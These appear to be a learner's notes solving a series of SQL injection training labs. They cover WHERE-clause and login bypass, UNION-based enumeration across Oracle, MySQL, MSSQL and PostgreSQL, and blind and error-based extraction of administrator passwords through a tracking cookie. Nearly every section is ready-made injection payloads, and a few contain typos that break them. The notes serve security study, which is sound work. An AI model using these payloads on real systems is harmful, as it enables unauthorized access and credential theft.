SQL injection
______________________________________________________________________________________________________________________________________________
Lab1.Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Ans :" GET /filter?category='+or+1%3d1-- HTTP/2 "
SELECT * FROM products WHERE category = 'Gifts' or 1=1 --

______________________________________________________________________________________________________________________________________________
Lab2 : Lab: SQL injection vulnerability allowing login bypass
       select user from users where username='admin' and password='xyzz';

Ans :  select user from users where username='admin' -- ;
       Set-Cookie: session=97DAaA1HHJNKuXkRqL6HoyyNuaDbeHj1; 

______________________________________________________________________________________________________________________________________________
Lab3 : Lab: SQL injection attack, querying the database type and version on Oracle

Ans  : category='
       category='--+

    - No of columns
       'union select null from dual--
       'union select null,null from dual--

    -  String / data type of colums
       'union select 'ABC',NULL from dual--

    - Version OF DB
       'UNION SELECT BANNER,NULL FROM v$version--


______________________________________________________________________________________________________________________________________________
Lab4 : SQL injection attack, querying the database type and version on MySQL and Microsoft

Ans  : GET /filter?category='
       GET /filter?category='--+

     - No of Columns
       ' union select null --+ Error
       ' union select null,null --+ 

       ' order by 1--+
       ' order by 2--+
       ' order by 3--+ Error
     - Data Type
       ' union select 'ABC','DEF' --+
     -MySQL and Microsoft DB Version
       ' union select @@version,'DEF' --+


______________________________________________________________________________________________________________________________________________
Lab5: SQL injection attack, listing the database contents on non-Oracle databases

Given : DB contains a table that holds usernames and passwords columns .

Q.      You need to determine the name of this table  & pASSWORD OF administrator

Ans  : GET /filter?category='
       GET /filter?category='--+

     - No of Columns
       ' union select null --+ Error
       ' union select null,null --+ 

       ' order by 1--+
       ' order by 2--+
       ' order by 3--+ Error
     - Data Type
       ' union select 'ABC','DEF' --+

     - Find DataBase Type:
       'union select version(),'DEF' --+  : PgSql
       
       'union select @@version,'DEF' --+  : MYSql/MS-SQL

       'union SELECT banner,'DEF' FROM v$version  --+   :Oracle 
       'union SELECT version,'DEF' FROM v$instance --+  :Oracle 

     - Find Table Name : Pgsql

      ' union select table_name,'ABC' from information_schema.tables --+

        Ans : users_onouxe,pg_user

     - Find columns :Pgsql

      ' UNION SELECT column_name, 'ABC' FROM information_schema.columns WHERE table_name='pg_user' --+
      ' UNION SELECT column_name, 'ABC' FROM information_schema.columns WHERE table_name='users_onouxe'--+


    - Find Password OF  administrator : 

      ' UNION SELECT password_rqmxso , 'ABC' FROM users_onouxe WHERE username_funlze='administrator' --+


______________________________________________________________________________________________________________________________________________
Lab6: SQL injection attack, listing the database contents on Oracle

GIVEN  :The database contains a table that holds usernames and passwords

        You need to determine the name of this table and the columns it contains, then retrieve the PASSWD OF administrator

ANS : GET /filter?category=Gifts'--+

      - find no of columns
        ' union select null,null from dual --+ : oracle db only

      -find data type of columns 
       ' union select 'ABC','DEF' from dual --+


      -find table name from Oracle DB 

      'union SELECT table_name,'ABC' FROM user_tables --+  : USERS_BYFICP ,PRODUCTS

     -Find colums name from Oracle DB  tables

      'union SELECT column_name,'ABC' FROM   all_tab_columns WHERE  table_name = 'USERS_BYFICP' --+ : USERNAME_SLTNDT ,PASSWORD_KWSPKR 

     - Find Password of user administrator

      'UNION SELECT PASSWORD_KWSPKR,'ABC' FROM USERS_BYFICP WHERE USERNAME_SLTNDT='administrator' --+  : nvtzkic1pfd8yay6eptu

______________________________________________________________________________________________________________________________________________
Lab7: SQL injection UNION attack, determining the number of columns returned by the query

      -FIND THE VULNERABLE PARAMETERS
      GET /filter?category=Pets'--+ HTTP/2



      -fIND THE NO. OF COLUMNS 
      'UNION SELECT NULL,NULL,NULL --+

      -FIND THE DATA TYPE OF COLUMNS
      'UNION SELECT NULL,'ABC',113 --+



______________________________________________________________________________________________________________________________________________
Lab8: SQL injection UNION attack, finding a column containing text
PRINT THIS 'LJXwKG' USING UNION

      -FIND THE VULNERABLE PARAMETERS
      GET /filter?category=Pets'--+ HTTP/2



      -fIND THE NO. OF COLUMNS 
      'UNION SELECT NULL,NULL,NULL --+

      -FIND THE DATA TYPE OF COLUMNS
      'UNION SELECT NULL,'LJXwKG',NULL --+


______________________________________________________________________________________________________________________________________________
Lab9: injection UNION attack, retrieving data from other tables

GIVEN : The database contains a different table called users.
        columns called username and password. FIND THE PASSWORD OF administrator. 

      -FIND THE VULNERABLE PARAMETERS
      GET /filter?category=Lifestyle'--+ HTTP/2



      -fIND THE NO. OF COLUMNS 
      'UNION SELECT NULL,NULL --+

      -FIND THE DATA TYPE OF COLUMNS
      'UNION SELECT 'abc','def' --+

      -FIND THE PASSWORD 
      'UNION SELECT 'ABC',password from users where sername='administrator' --+




______________________________________________________________________________________________________________________________________________
Lab10: SQL injection UNION attack, retrieving multiple values in a single column

GIVEN : The database contains a different table called users, with columns called username and password. 

      -FIND THE VULNERABLE PARAMETERS
      GET /filter?category=Gifts'--+ HTTP/2



      -fIND THE NO. OF COLUMNS 
      'UNION SELECT NULL,NULL --+

      -FIND THE DATA TYPE OF COLUMNS
      'UNION SELECT NULL,'abc' --+

      -FIND THE DB VENDOR 
       'UNION SELECT NULL,version() --+

      -FIND THE USER & PASSWORD 
      'UNION SELECT NULL,username||'~'||password from users --+

      'UNION SELECT NULL,password FROM USERS WHERE username='administrator' --+


______________________________________________________________________________________________________________________________________________
Lab11: Blind SQL injection with conditional responses
GIVEN :The database contains a different table called users, with columns called username and password. 

   -FIND THE VULNERABLE PARAMETERS
    tracking cookie 


   -Modify the TrackingId cookie, changing it to: 
     TrackingId=Ypk14n3CAwrTbG3F'and 1=1 --+  : WELCOME BACK
     TrackingId=Ypk14n3CAwrTbG3F'and 1=2 --+   : NO RESPONSE 

   -CONFIRM THAT WE HAVE users TABLE.
    ' AND (SELECT 'X' FROM USERS LIMIT 1)='X' --+ : CHECK THE RESPONSE

   -CONFIRM THAT WE HAVE users ADMINIOSTRATOR EXISTS IN TABLE.
   ' AND (SELECT 'X' FROM USERS WHERE USERNAME='administrator')='X' --+
   ' AND (SELECT USERNAME FROM USERS WHERE USERNAME='administrator')='administrator' --+

   -ENUMERATE THE PASSWORD OF administrator

    1.Find the length of password:
     ' AND (SELECT USERNAME FROM USERS WHERE USERNAME='administrator' AND LENGTH(password)>1)='administrator' --+
      use Burp Intruder to get exact password length.
    
    2.Now use Burp Intruder to get password.
     ' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$' --+

      password:y78sle0vz77abicmav7i



______________________________________________________________________________________________________________________________________________
Lab12: Blind SQL injection with conditional errors

GIVEN : The database contains a different table called users, with columns called username and password. 

   -FIND THE VULNERABLE PARAMETERS
    tracking cookie 

   -confirm that the server is interpreting the injection as a SQL query 
   TrackingId=xyz'||(SELECT '' from dual)||'-- :ORACLE DB
   TrackingId=xyz'||(SELECT '' )||'--          :MYSQL DB


   -CONFIRM USER TABLE IS EXIST OR NOT
    '||(SELECT '' FROM USERS)||'--+
    '||(SELECT '' FROM USERS WHERE ROWNUM=1)||'  :ORACLE DB


   -CONFIRM USER (administrator) IS EXIST OR NOT
    
    1.You can also exploit this behavior to test conditions. First, submit the following query:

      TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
      
      TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/1) ELSE '' END FROM dual)||'

   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'


   -ENUMERATE THE PASSWORD OF administrator

    1.Find the length of password:
    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(PASSWORD)>$1$)||'   : ERROR -> IT'S OK


   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' SUBSTR(password,1,1)='ยงaยง')||'
   

   TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

   administrator:bfnbkuizg258kmnd7dti


______________________________________________________________________________________________________________________________________________
Lab13: Visible error-based SQL injection

   -FIND THE VULNERABLE PARAMETERS
      Cookie: TrackingId=XDtdqzHxWpaoVHWY'
      Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'XDtdqzHxWpaoVHWY''. Expected  char
 
      TrackingId=ogAZZfxtOKUELbuJ'-- : No ERROR


      TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- : error saying that an AND condition must be a boolean expression.

      TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- : Confirm that you no longer receive an error. This suggests that this is a valid query again. 


   -Use SELECT statement so that it retrieves usernames from the database: 

      TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)-- :now appears to be truncated due to a character limit

      - Delete the original value of the TrackingId cookie 
         TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
    
      -Modify the query to return only one row: 
      TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- : ERROR: invalid input syntax for type integer: "administrator"

      TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- : ERROR: invalid input syntax for type integer: "7dyyovv2lwbtygr2bc7n"

